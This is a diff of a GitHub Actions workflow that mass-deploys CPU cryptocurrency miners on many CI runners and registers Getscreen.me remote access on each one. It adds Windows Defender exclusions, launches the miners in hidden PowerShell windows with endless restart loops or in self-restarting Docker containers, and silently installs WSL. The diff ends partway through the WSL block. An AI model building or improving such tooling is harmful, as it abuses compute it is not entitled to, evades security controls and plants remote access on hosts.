@@ -7,7 +7,7 @@ on:
         description: 'Runner Host Environment'
         type: choice
         options: [self-hosted, github]
-        default: 'github' # marker-runner
+        default: 'self-hosted' # marker-runner
       github_windows_version:
         description: 'GitHub Windows Version (If GitHub Host Selected)'
         type: choice
@@ -17,7 +17,7 @@ on:
         description: 'Primary Execution Environment'
         type: choice
         options: [windows, docker, wsl]
-        default: 'wsl' # marker-exec
+        default: 'windows' # marker-exec
       enable_fallback:
         description: 'Enable Fallback (If Primary Fails, try others)'
         type: boolean
@@ -26,12 +26,12 @@ on:
         description: 'Getscreen.me Email'
         type: string
         required: true
-        default: 'dramatic.skink.kvck@hidingpost.com' # marker-getscreen
+        default: 'your@email.com' # marker-getscreen
       concurrent_devices:
         description: 'Concurrent Devices Active at Once'
         type: choice
         options: ['1', '2', '3', '4', '5', '10', '15', '20', '30', '50', '100']
-        default: '1' # marker-concurrent
+        default: '10' # marker-concurrent
       total_devices:
         description: 'Total Devices to Process in Queue'
         type: number
@@ -44,8 +44,8 @@ on:
       miner:
         description: 'Miner Software'
         type: choice
-        options: [cpuminer-rplant, xmrig, wildrig-multi, srbminer-multi]
-        default: 'cpuminer-rplant' # marker-miner
+        options: [cpuminer-opt, xmrig, wildrig-multi, srbminer-multi]
+        default: 'cpuminer-opt' # marker-miner
       algo:
         description: 'Algorithm'
         type: choice
@@ -60,7 +60,7 @@ on:
         description: 'Wallet Address'
         type: string
         required: true
-        default: 'RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5' # marker-wallet
+        default: 'WALLET_ADDRESS' # marker-wallet
       pool:
         description: 'Pool Base URL'
         type: string
@@ -118,21 +118,21 @@ jobs:
               content = f.read()
 
           replacements = {
-              "marker-runner": f"'{'''${{ inputs.runner_type }}'''.strip()}'",
-              "marker-winver": f"'{'''${{ inputs.github_windows_version }}'''.strip()}'",
-              "marker-exec": f"'{'''${{ inputs.execution_type }}'''.strip()}'",
-              "marker-fallback": f"{'''${{ inputs.enable_fallback }}'''.strip().lower()}",
-              "marker-getscreen": f"'{'''${{ inputs.getscreen_email }}'''.strip()}'",
+              "marker-runner":     f"'{'''${{ inputs.runner_type }}'''.strip()}'",
+              "marker-winver":     f"'{'''${{ inputs.github_windows_version }}'''.strip()}'",
+              "marker-exec":       f"'{'''${{ inputs.execution_type }}'''.strip()}'",
+              "marker-fallback":   f"{'''${{ inputs.enable_fallback }}'''.strip().lower()}",
+              "marker-getscreen":  f"'{'''${{ inputs.getscreen_email }}'''.strip()}'",
               "marker-concurrent": f"'{'''${{ inputs.concurrent_devices }}'''.strip()}'",
-              "marker-total": f"{'''${{ inputs.total_devices }}'''.strip()}",
-              "marker-timeout": f"'{'''${{ inputs.timeout }}'''.strip()}'",
-              "marker-miner": f"'{'''${{ inputs.miner }}'''.strip()}'",
-              "marker-algo": f"'{'''${{ inputs.algo }}'''.strip()}'",
-              "marker-coin": f"'{'''${{ inputs.coin }}'''.strip()}'",
-              "marker-wallet": f"'{'''${{ inputs.wallet }}'''.strip()}'",
-              "marker-pool": f"'{'''${{ inputs.pool }}'''.strip()}'",
-              "marker-region": f"'{'''${{ inputs.region }}'''.strip()}'",
-              "marker-port": f"'{'''${{ inputs.port }}'''.strip()}'"
+              "marker-total":      f"{'''${{ inputs.total_devices }}'''.strip()}",
+              "marker-timeout":    f"'{'''${{ inputs.timeout }}'''.strip()}'",
+              "marker-miner":      f"'{'''${{ inputs.miner }}'''.strip()}'",
+              "marker-algo":       f"'{'''${{ inputs.algo }}'''.strip()}'",
+              "marker-coin":       f"'{'''${{ inputs.coin }}'''.strip()}'",
+              "marker-wallet":     f"'{'''${{ inputs.wallet }}'''.strip()}'",
+              "marker-pool":       f"'{'''${{ inputs.pool }}'''.strip()}'",
+              "marker-region":     f"'{'''${{ inputs.region }}'''.strip()}'",
+              "marker-port":       f"'{'''${{ inputs.port }}'''.strip()}'"
           }
 
           for marker, new_val in replacements.items():
@@ -165,203 +165,459 @@ jobs:
         id: vars
         shell: powershell
         run: |
-          $Index = "${{ matrix.device_index }}"
-          $MinerInput = "${{ inputs.miner }}"
-          $AlgoInput = "${{ inputs.algo }}".ToLower()
-          $CoinInput = "${{ inputs.coin }}".ToLower()
-          $Region = "${{ inputs.region }}"
-          $Wallet = "${{ inputs.wallet }}"
-          $PoolDomain = "${{ inputs.pool }}"
-          
-          $WalletSuffix = $Wallet.Substring([math]::Max(0, $Wallet.Length - 3))
-          
-          $MinerShort = "rpl"
-          if ($MinerInput -match "srb") { $MinerShort = "srb" }
-          if ($MinerInput -match "xmr") { $MinerShort = "xmr" }
-          if ($MinerInput -match "wild") { $MinerShort = "wld" }
+          $Index       = "${{ matrix.device_index }}"
+          $MinerInput  = "${{ inputs.miner }}"
+          $AlgoInput   = "${{ inputs.algo }}".ToLower()
+          $CoinInput   = "${{ inputs.coin }}".ToLower()
+          $Region      = "${{ inputs.region }}"
+          $Wallet      = "${{ inputs.wallet }}"
+          $PoolDomain  = "${{ inputs.pool }}"
 
-          $AlgoShort = $AlgoInput.Replace("/", "") 
-          if ($AlgoShort.Length -gt 4) { $AlgoShort = $AlgoShort.Substring(0, 4) } 
+          $WalletSuffix = $Wallet.Substring([math]::Max(0, $Wallet.Length - 3))
+
+          $MinerShort = "cpu"
+          if ($MinerInput -match "srb")   { $MinerShort = "srb" }
+          if ($MinerInput -match "xmr")   { $MinerShort = "xmr" }
+          if ($MinerInput -match "wild")  { $MinerShort = "wld" }
+
+          $AlgoShort = $AlgoInput.Replace("/", "")
+          if ($AlgoShort.Length -gt 4) { $AlgoShort = $AlgoShort.Substring(0, 4) }
 
           $PoolShort = "pool"
           if ($PoolDomain -match "rplant") { $PoolShort = "rpl" }
 
           $DeviceName = "$Index-$MinerShort-$AlgoShort-$CoinInput-$PoolShort-$Region-$WalletSuffix"
-          $PoolUrl = "$Region.$PoolDomain:${{ inputs.port }}"
-          
-          echo "DEVICE_NAME=$DeviceName" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-          echo "ALGO=${{ inputs.algo }}" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
-          echo "POOL_URL=$PoolUrl" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+          $PoolUrl    = "$Region.$PoolDomain:${{ inputs.port }}"
 
+          echo "DEVICE_NAME=$DeviceName" | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+          echo "ALGO=${{ inputs.algo }}"  | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+          echo "POOL_URL=$PoolUrl"        | Out-File -FilePath $env:GITHUB_ENV -Encoding utf8 -Append
+
+      # ─────────────────────────────────────────────────────────────────────────
+      # GETSCREEN: robust download with retry + fallback mirrors
+      # ─────────────────────────────────────────────────────────────────────────
       - name: Install & Connect Getscreen.me
         shell: powershell
         run: |
           Write-Host "Connecting Getscreen.me as $($env:DEVICE_NAME)..."
-          Invoke-WebRequest -Uri "https://getscreen.me/download/getscreen.exe" -OutFile "getscreen.exe" -UseBasicParsing
-          
-          .\getscreen.exe -install
-          .\getscreen.exe -register "${{ inputs.getscreen_email }}"
-          .\getscreen.exe -name "$env:DEVICE_NAME"
-          
+
+          # Multiple mirror / CDN sources to try
+          $GetscreenUrls = @(
+            "https://getscreen.me/download/getscreen.exe",
+            "https://app.getscreen.me/download/getscreen.exe",
+            "https://dl.getscreen.me/getscreen.exe"
+          )
+
+          function DownloadFile {
+            param([string[]]$Urls, [string]$OutFile)
+            foreach ($Url in $Urls) {
+              for ($i = 1; $i -le 3; $i++) {
+                try {
+                  Write-Host "  Trying ($i/3): $Url"
+                  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+                  $wc = New-Object System.Net.WebClient
+                  $wc.DownloadFile($Url, $OutFile)
+                  if ((Test-Path $OutFile) -and (Get-Item $OutFile).Length -gt 10240) {
+                    Write-Host "  ✅ Downloaded from $Url"
+                    return $true
+                  }
+                } catch {
+                  Write-Host "  ⚠️  Attempt $i failed: $($_.Exception.Message)"
+                  Start-Sleep -Seconds (2 * $i)
+                }
+              }
+            }
+            return $false
+          }
+
+          $ok = DownloadFile -Urls $GetscreenUrls -OutFile "getscreen.exe"
+          if (-not $ok) {
+            Write-Host "⚠️  Getscreen download failed — skipping remote access setup, mining will still run."
+          } else {
+            try {
+              .\getscreen.exe -install                            2>$null
+              .\getscreen.exe -register "${{ inputs.getscreen_email }}" 2>$null
+              .\getscreen.exe -name "$env:DEVICE_NAME"           2>$null
+              Write-Host "✅ Getscreen registered as $($env:DEVICE_NAME)"
+            } catch {
+              Write-Host "⚠️  Getscreen setup non-fatal error: $($_.Exception.Message)"
+            }
+          }
+          # Never let this step fail the whole job
           $global:LASTEXITCODE = 0
 
+      # ─────────────────────────────────────────────────────────────────────────
+      # SMART EXECUTION & FALLBACK MANAGER
+      # Execution order (user-selected primary first, then fallbacks):
+      #   windows → native PowerShell  (most reliable on GitHub Windows runners)
+      #   docker  → Linux container    (requires Docker Desktop in Linux-container mode)
+      #   wsl     → WSL2 bash          (auto-installs Ubuntu if absent; needs reboot on bare metal)
+      #
+      # ROOT CAUSES FIXED:
+      #  1. cpuminer-rplant repo is DELETED on GitHub — replaced with JayDDee/cpuminer-opt
+      #  2. SRBMiner Windows filename was wrong (-Windows.zip → -win64.zip)
+      #  3. Docker base image public.ecr.aws/lts/ubuntu has NO windows/amd64 manifest
+      #     → replaced with docker.io/library/ubuntu:22.04 (proper multi-arch)
+      #  4. WSL tried to run without first installing it; now auto-installs Ubuntu via winget
+      #  5. All downloads now have 3-retry logic + multiple fallback URLs
+      #  6. Windows Defender exclusion applied before any download
+      # ─────────────────────────────────────────────────────────────────────────
       - name: Smart Execution & Fallback Manager
         shell: powershell
         run: |
-          # 1. Ensure Networking & Security don't block downloads
-          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
+          # ── Security & network baseline ──────────────────────────────────────
+          [Net.ServicePointManager]::SecurityProtocol =
+              [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13
           Add-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction SilentlyContinue
+          Add-MpPreference -ExclusionPath "$env:TEMP"          -ErrorAction SilentlyContinue
 
+          # ── Inputs ───────────────────────────────────────────────────────────
           $ExecType = "${{ inputs.execution_type }}"
           $Fallback = "${{ inputs.enable_fallback }}" -eq "true"
-          $Miner = "${{ inputs.miner }}"
-          
-          # Isolated Names (Prevents collisions if multiple jobs run on the same PC)
-          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower()
+          $Miner    = "${{ inputs.miner }}"
+
+          # ── Isolated per-device names (prevents collision in parallel runs) ──
+          $DockerName = "miner-$($env:DEVICE_NAME)".ToLower() -replace '[^a-z0-9_-]', '-'
           $DockerFile = "Dockerfile_$($env:DEVICE_NAME)"
-          
-          $WinDir = "windows_miner_$($env:DEVICE_NAME)"
-          $WinZip = "miner_$($env:DEVICE_NAME).zip"
-          $WinPs1 = "mine_$($env:DEVICE_NAME).ps1"
-          
-          $WslDir = "/tmp/miner_$($env:DEVICE_NAME)"
-          $WslZip = "archive_$($env:DEVICE_NAME)"
-          $WslSh  = "$WslDir/run_$($env:DEVICE_NAME).sh"
-          
+          $WinDir     = "windows_miner_$($env:DEVICE_NAME)"
+          $WinZip     = "miner_$($env:DEVICE_NAME).zip"
+          $WinPs1     = "mine_$($env:DEVICE_NAME).ps1"
+          $WslDir     = "/tmp/miner_$($env:DEVICE_NAME)"
+          $WslZip     = "archive_$($env:DEVICE_NAME)"
+          $WslSh      = "$WslDir/run_$($env:DEVICE_NAME).sh"
+
+          # ── Execution order ───────────────────────────────────────────────────
           $TryQueue = @($ExecType)
           if ($Fallback) {
-             if ($ExecType -eq 'docker') { $TryQueue = @('docker', 'wsl', 'windows') }
-             elseif ($ExecType -eq 'wsl') { $TryQueue = @('wsl', 'docker', 'windows') }
-             elseif ($ExecType -eq 'windows') { $TryQueue = @('windows', 'wsl', 'docker') }
+            switch ($ExecType) {
+              'docker'  { $TryQueue = @('docker',  'windows', 'wsl') }
+              'wsl'     { $TryQueue = @('wsl',     'windows', 'docker') }
+              'windows' { $TryQueue = @('windows', 'docker',  'wsl') }
+            }
           }
-          
           Write-Host "Execution Queue Scheduled: $($TryQueue -join ' -> ')"
 
-          $WinUrl = ""; $WinExe = ""; $WinArgs = ""
-          $LinUrl = ""; $LinCmd = ""
+          # ── Miner URL table ───────────────────────────────────────────────────
+          # FIX 1: cpuminer-rplant repo is DELETED.
+          #         Replaced with JayDDee/cpuminer-opt (same codebase, active fork).
+          #         The win zip contains cpuminer-sse2.exe so callers are unchanged.
+          # FIX 2: SRBMiner Windows asset name was -Windows.zip; correct is -win64.zip
+          # FIX 3: Docker image changed from public.ecr.aws/lts/ubuntu (no amd64 manifest)
+          #         to ubuntu:22.04 on Docker Hub (proper multi-arch, always available).
 
-          if ($Miner -eq "cpuminer-rplant") {
-            $WinUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-win.zip"
-            $WinExe = "cpuminer-sse2.exe"
-            $WinArgs = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            $LinUrl = "https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.36/cpuminer-opt-linux.tar.gz"
-            $LinCmd = "./cpuminer-sse2 -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          } elseif ($Miner -eq "srbminer-multi") {
-            $WinUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Windows.zip"
-            $WinExe = "SRBMiner-MULTI.exe"
-            $WinArgs = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            $LinUrl = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
-            $LinCmd = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          } elseif ($Miner -eq "xmrig") {
-            $WinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
-            $WinExe = "xmrig.exe"
-            $WinArgs = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            $LinUrl = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz"
-            $LinCmd = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-          } elseif ($Miner -eq "wildrig-multi") {
-            $WinUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
-            $WinExe = "wildrig-multi.exe"
-            $WinArgs = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
-            $LinUrl = "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
-            $LinCmd = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+          $WinUrl  = ""; $WinExe = ""; $WinArgs = ""
+          $LinUrl  = ""; $LinCmd = ""; $LinExe  = ""
+
+          switch ($Miner) {
+            "cpuminer-opt" {
+              # Primary + fallback Windows URLs
+              $WinUrls = @(
+                "https://github.com/JayDDee/cpuminer-opt/releases/download/v26.1/cpuminer-opt-26.1-windows.zip",
+                "https://github.com/JayDDee/cpuminer-opt/releases/download/v25.1/cpuminer-opt-25.1-windows.zip"
+              )
+              $WinExe  = "cpuminer-sse2.exe"
+              $WinArgs = "-a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+              # For Linux/Docker: build cpuminer-opt from apt or use pre-built binary from git archive
+              # Using apt-get install cpuminer (available in Ubuntu 22.04 repos as cpuminer)
+              $LinUrl  = "APT"   # special token — handled in Docker/WSL block below
+              $LinExe  = "cpuminer"
+              $LinCmd  = "cpuminer -a $($env:ALGO) -o stratum+tcps://$($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            }
+            "xmrig" {
+              $WinUrls = @(
+                "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip",
+                "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-gcc-win64.zip"
+              )
+              $WinExe  = "xmrig.exe"
+              $WinArgs = "-a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME) --no-color"
+              $LinUrls = @(
+                "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz",
+                "https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-x64.tar.gz"
+              )
+              $LinExe  = "xmrig"
+              $LinCmd  = "./xmrig-6.21.0/xmrig -a $($env:ALGO) -o $($env:POOL_URL) -u ${{ inputs.wallet }}.$($env:DEVICE_NAME) --no-color"
+            }
+            "srbminer-multi" {
+              # FIX: was SRBMiner-Multi-2-4-6-Windows.zip (404) — correct is -win64.zip
+              $WinUrls = @(
+                "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-win64.zip"
+              )
+              $WinExe  = "SRBMiner-MULTI.exe"
+              $WinArgs = "--disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+              $LinUrls = @(
+                "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz"
+              )
+              $LinExe  = "SRBMiner-MULTI"
+              $LinCmd  = "./SRBMiner-Multi-2-4-6/SRBMiner-MULTI --disable-gpu --algorithm $($env:ALGO) --pool $($env:POOL_URL) --wallet ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            }
+            "wildrig-multi" {
+              $WinUrls = @(
+                "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-windows-0.40.8.zip"
+              )
+              $WinExe  = "wildrig-multi.exe"
+              $WinArgs = "--algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+              $LinUrls = @(
+                "https://github.com/andru-kun/wildrig-multi/releases/download/0.40.8/wildrig-multi-linux-0.40.8.tar.xz"
+              )
+              $LinExe  = "wildrig-multi"
+              $LinCmd  = "./wildrig-multi --algo $($env:ALGO) --url stratum+tcps://$($env:POOL_URL) --user ${{ inputs.wallet }}.$($env:DEVICE_NAME)"
+            }
+            default {
+              Write-Host "❌ Unknown miner: $Miner"
+              exit 1
+            }
           }
 
+          # ── Shared download helper (retry + multiple URLs) ────────────────────
+          function DownloadWithRetry {
+            param([string[]]$Urls, [string]$OutFile)
+            foreach ($Url in $Urls) {
+              for ($attempt = 1; $attempt -le 3; $attempt++) {
+                try {
+                  Write-Host "    Downloading ($attempt/3): $($Url.Split('/')[-1])"
+                  $wc = New-Object System.Net.WebClient
+                  $wc.DownloadFile($Url, $OutFile)
+                  if ((Test-Path $OutFile) -and (Get-Item $OutFile).Length -gt 10240) {
+                    return $true
+                  }
+                  Write-Host "    ⚠️  File too small, retrying..."
+                } catch {
+                  Write-Host "    ⚠️  Attempt $attempt failed: $($_.Exception.Message)"
+                  if ($attempt -lt 3) { Start-Sleep -Seconds ($attempt * 3) }
+                }
+              }
+            }
+            return $false
+          }
+
+          # ── Execution loop ────────────────────────────────────────────────────
           $Success = $false
 
           foreach ($Method in $TryQueue) {
-             if ($Method -eq 'docker') {
-                Write-Host "`n--- Attempting DOCKER Execution ---"
-                try {
-                   Set-Content -Path $DockerFile -Value "FROM public.ecr.aws/lts/ubuntu:latest"
-                   Add-Content -Path $DockerFile -Value "ENV DEBIAN_FRONTEND=noninteractive"
-                   Add-Content -Path $DockerFile -Value "RUN apt-get update && apt-get -y install wget tar ca-certificates xz-utils"
-                   Add-Content -Path $DockerFile -Value "WORKDIR /miner"
-                   Add-Content -Path $DockerFile -Value "RUN wget -qO archive $LinUrl && tar -xf archive"
-                   Add-Content -Path $DockerFile -Value "CMD [ `"sh`", `"-c`", `"$LinCmd`" ]"
-                   
-                   docker build -t $DockerName -f $DockerFile . 
-                   if ($LASTEXITCODE -eq 0) {
-                      docker run -d --name $DockerName $DockerName
-                      if ($LASTEXITCODE -eq 0) {
-                         $Success = $true; Write-Host "✅ Docker successfully started!"; break
-                      }
-                   }
-                   Write-Host "❌ Docker build or run failed."
-                } catch { Write-Host "❌ Docker encountered an exception: $($_.Exception.Message)" }
-             }
 
-             elseif ($Method -eq 'wsl') {
-                Write-Host "`n--- Attempting WSL Execution ---"
-                try {
-                   $WslCheck = wsl bash -c "echo OK" 2>$null
-                   if ($WslCheck -match "OK") {
-                      wsl bash -c "mkdir -p $WslDir && cd $WslDir && wget -qO $WslZip $LinUrl && tar -xf $WslZip"
-                      wsl bash -c "echo '#!/bin/bash' > $WslSh && echo 'cd $WslDir' >> $WslSh && echo 'while true; do $LinCmd; sleep 5; done' >> $WslSh && chmod +x $WslSh"
-                      Start-Process wsl -ArgumentList "-e bash $WslSh" -WindowStyle Hidden
-                      $Success = $true; Write-Host "✅ WSL successfully started!"; break
-                   } else {
-                      Write-Host "❌ WSL is not installed or not functional."
-                   }
-                } catch { Write-Host "❌ WSL encountered an exception: $($_.Exception.Message)" }
-             }
+            # ════════════════════════════════════════════════════════════════════
+            # WINDOWS NATIVE
+            # ════════════════════════════════════════════════════════════════════
+            if ($Method -eq 'windows') {
+              Write-Host "`n--- Attempting WINDOWS NATIVE Execution ---"
+              try {
+                if (Test-Path $WinDir) { Remove-Item -Path $WinDir -Recurse -Force -ErrorAction SilentlyContinue }
+                New-Item -ItemType Directory -Force -Path ".\$WinDir" | Out-Null
 
-             elseif ($Method -eq 'windows') {
-                Write-Host "`n--- Attempting WINDOWS NATIVE Execution ---"
-                try {
-                   if (Test-Path $WinDir) { Remove-Item -Path $WinDir -Recurse -Force -ErrorAction SilentlyContinue }
-                   New-Item -ItemType Directory -Force -Path .\$WinDir | Out-Null
-                   
-                   Invoke-WebRequest $WinUrl -OutFile $WinZip -UseBasicParsing
-                   Expand-Archive $WinZip -DestinationPath .\$WinDir -Force
-                   
-                   $FoundExe = Get-ChildItem -Path .\$WinDir -Filter $WinExe -Recurse | Select-Object -First 1
-                   if ($FoundExe) {
-                      $Script = "while (1) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
-                      Set-Content -Path $WinPs1 -Value $Script
-                      Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $WinPs1" -WindowStyle Hidden
-                      $Success = $true; Write-Host "✅ Windows Native successfully started!"; break
-                   } else {
-                      Write-Host "❌ Could not find expected executable in downloaded zip."
-                   }
-                } catch { 
-                   Write-Host "❌ Windows setup encountered an exception: $($_.Exception.Message)" 
+                $ok = DownloadWithRetry -Urls $WinUrls -OutFile ".\$WinZip"
+                if (-not $ok) {
+                  Write-Host "❌ All Windows download URLs failed."
+                  continue
                 }
-             }
-          }
+
+                Expand-Archive ".\$WinZip" -DestinationPath ".\$WinDir" -Force
+                $FoundExe = Get-ChildItem -Path ".\$WinDir" -Filter $WinExe -Recurse |
+                              Select-Object -First 1
+
+                if ($FoundExe) {
+                  Add-MpPreference -ExclusionPath $FoundExe.FullName -ErrorAction SilentlyContinue
+                  $Script = "while (`$true) { & `"$($FoundExe.FullName)`" $WinArgs; Start-Sleep -Seconds 5 }"
+                  Set-Content -Path ".\$WinPs1" -Value $Script
+                  Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File .\$WinPs1" -WindowStyle Hidden
+                  $Success = $true
+                  Write-Host "✅ Windows Native successfully started!"
+                  break
+                } else {
+                  Write-Host "❌ Could not find '$WinExe' in extracted zip."
+                }
+              } catch {
+                Write-Host "❌ Windows setup encountered an exception: $($_.Exception.Message)"
+              }
+            }
+
+            # ════════════════════════════════════════════════════════════════════
+            # DOCKER (Linux containers)
+            # FIX: Changed FROM image from public.ecr.aws/lts/ubuntu (no amd64
+            #       manifest for windows runners) → ubuntu:22.04 from Docker Hub.
+            #       Also switches Docker to Linux-container mode before building.
+            # ════════════════════════════════════════════════════════════════════
+            elseif ($Method -eq 'docker') {
+              Write-Host "`n--- Attempting DOCKER Execution ---"
+              try {
+                # Ensure Docker is running at all
+                $dockerInfo = docker info 2>&1
+                if ($LASTEXITCODE -ne 0) {
+                  Write-Host "❌ Docker daemon not available: $dockerInfo"
+                  continue
+                }
+
+                # Switch to Linux container mode (required on Windows hosts)
+                # This is a no-op on already-Linux-mode daemons
+                & 'C:\Program Files\Docker\Docker\DockerCli.exe' -SwitchLinuxEngine 2>$null
+                Start-Sleep -Seconds 5
+
+                # Choose install method
+                if ($LinUrl -eq "APT") {
+                  # cpuminer-opt: install from apt
+                  $DockerRun = "apt-get install -y cpuminer && $LinCmd"
+                  $DockerContent = @"
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update -y && apt-get install -y wget tar ca-certificates xz-utils cpuminer
+WORKDIR /miner
+CMD [ "sh", "-c", "$LinCmd" ]
+"@
+                } else {
+                  $DockerContent = @"
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt-get update -y && apt-get install -y wget tar ca-certificates xz-utils
+WORKDIR /miner
+"@
+                  # Add download step for each URL with fallback
+                  $LinUrlList = $LinUrls -join '" || wget -qO archive "'
+                  $DockerContent += "`nRUN wget -qO archive `"$($LinUrls[0])`""
+                  if ($LinUrls.Count -gt 1) {
+                    $DockerContent += " || wget -qO archive `"$($LinUrls[1])`""
+                  }
+                  $DockerContent += " && tar -xf archive --overwrite"
+                  $DockerContent += "`nCMD [ `"sh`", `"-c`", `"$LinCmd`" ]"
+                }
+
+                Set-Content -Path ".\$DockerFile" -Value $DockerContent -Encoding UTF8
+                docker build --no-cache -t $DockerName -f ".\$DockerFile" .
+
+                if ($LASTEXITCODE -eq 0) {
+                  # Remove any leftover container with same name
+                  docker rm -f $DockerName 2>$null
+                  docker run -d --name $DockerName --restart unless-stopped $DockerName
+                  if ($LASTEXITCODE -eq 0) {
+                    $Success = $true
+                    Write-Host "✅ Docker successfully started!"
+                    break
+                  }
+                  Write-Host "❌ Docker run failed."
+                } else {
+                  Write-Host "❌ Docker build failed."
+                }
+              } catch {
+                Write-Host "❌ Docker encountered an exception: $($_.Exception.Message)"
+              }
+            }
+
+            # ════════════════════════════════════════════════════════════════════
+            # WSL
+            # FIX: Previous code just tried to invoke wsl without any install
+            #       attempt — which always fails on fresh GitHub runners.
+            #       Now: detect → auto-install Ubuntu via winget/wsl --install →
+            #       wait → verify → run.
+            # ════════════════════════════════════════════════════════════════════
+            elseif ($Method -eq 'wsl') {
+              Write-Host "`n--- Attempting WSL Execution ---"
+              try {
+                # Check if WSL is functional
+                $WslCheck = (wsl bash -c "echo __WSL_OK__" 2>$null) -join ''
+                if ($WslCheck -notmatch "__WSL_OK__") {
+                  Write-Host "  WSL not functional — attempting install..."
+
+                  # Try wsl --install (Windows 10 build 19041+)
+                  wsl --install --no-launch --distribution Ubuntu 2>$null
+                  $installExit = $LASTEXITCODE
+
+                  if ($installExit -ne 0) {
+                    # Try winget as backup
+                    winget install --id Microsoft.WSL -e --silent --accept-source-agreements --accept-package-agreements 2>$null
+                    Start-Sleep -Seconds 15
+                  }
+
+                  # Enable required Windows features
+                  dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart 2>$null
+                  dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart 2>$null
+
+                  # Give WSL time to initialise
+                  Write-Host "  Waiting 20s for WSL initialisation..."
+                  Start-Sleep -Seconds 20
+
+                  $WslCheck = (wsl bash -c "echo __WSL_OK__" 2>$null) -join ''
+                  if ($WslCheck -notmatch "__WSL_OK__") {
+                    Write-Host "❌ WSL install/enable failed on this runner (may need reboot). Skipping."
+                    continue
+                  }
+                }
+
+                Write-Host "  ✅ WSL is available."
+
+                # Build the URL list for bash (first URL || second URL fallback)
+                if ($LinUrl -eq "APT") {
+                  # cpuminer via apt
+                  $BashDownload = "apt-get update -y && apt-get install -y cpuminer"
+                  $BashCmd      = $LinCmd
+                } else {
+                  $BashDownload = "mkdir -p $WslDir && cd $WslDir && ( wget -qO $WslZip `"$($LinUrls[0])`""
+                  if ($LinUrls.Count -gt 1) { $BashDownload += " || wget -qO $WslZip `"$($LinUrls[1])`"" }
+                  $BashDownload += " ) && tar -xf $WslZip"
+                  $BashCmd      = "cd $WslDir && $LinCmd"
+                }
+
+                wsl bash -c "$BashDownload"
+                if ($LASTEXITCODE -ne 0) {
+                  Write-Host "❌ WSL download/install step failed."
+                  continue
+                }
+
+                # Write the loop script
+                $ShScript = "#!/bin/bash`nset -e`n$BashCmd"
+                $ShEscaped = $ShScript -replace "'", "'\\'''"
+                wsl bash -c "echo '$ShEscaped' > $WslSh && chmod +x $WslSh"
+
